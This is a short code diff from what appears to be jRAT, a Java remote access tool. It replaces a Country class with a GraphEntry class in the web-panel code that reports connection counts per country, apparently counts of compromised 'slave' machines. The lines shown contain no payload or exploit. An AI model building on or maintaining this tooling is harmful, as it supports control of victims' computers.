@@ -6,13 +6,13 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 
-import com.redpois0n.graphs.country.Country;
-
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.settings.CountryStatistics.CountryStatEntry;
+
+import com.redpois0n.graphs.graph.GraphEntry;
 
 public class WebPanelConnection implements Runnable {
 
@@ -76,9 +76,9 @@ public class WebPanelConnection implements Runnable {
                 	for (int i = 0; i < CountryStatistics.getGlobal().getList().size(); i++) {
             			CountryStatEntry entry = CountryStatistics.getGlobal().getList().get(i);
             			try {
-
-            				Country total = new Country(entry.getCountry(), entry.getConnects());
-            				sb.append(total.getIso() + "," + total.getNumber());
+            				GraphEntry total = new GraphEntry(entry.getCountry(), entry.getConnects());
+            				
+            				sb.append(total.getDisplay() + "," + total.getNumber());
             				sb.append(";");
             			} catch (Exception ex) {
             				ex.printStackTrace();
